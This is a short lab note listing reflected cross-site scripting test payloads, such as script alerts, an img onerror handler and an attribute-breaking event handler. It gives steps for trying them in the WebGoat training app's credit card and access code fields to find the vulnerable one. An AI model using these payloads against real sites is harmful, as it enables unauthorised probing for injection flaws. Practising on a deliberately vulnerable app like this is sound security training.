=== Reflected XSS Test Payloads ===

Try these payloads in BOTH fields (credit card number and access code):

1. Basic alert:
<script>alert('XSS')</script>

2. Console log:
<script>console.log('XSS')</script>

3. Image onerror:
<img src=x onerror=alert('XSS')>

4. With valid-looking number prefix:
4123<script>alert('XSS')</script>

5. Event handler:
" onload="alert('XSS')

6. Simple tag:
<b>test</b>

Instructions:
1. Open WebGoat in your browser
2. Navigate to: Cross Site Scripting (XSS) -> Try It! Reflected XSS
3. Test each payload in the "credit card number" field first
4. Then test in the "access code" field
5. Click submit after each test
6. Look for:
   - Alert popup appearing
   - Console.log message in F12 console
   - The payload being reflected in the page source (right-click -> View Page Source)

The vulnerable field is the one where:
- Your script executes (alert pops up)
- OR your HTML tags render (like <b> making text bold)
- OR you can see your unescaped payload in the page source
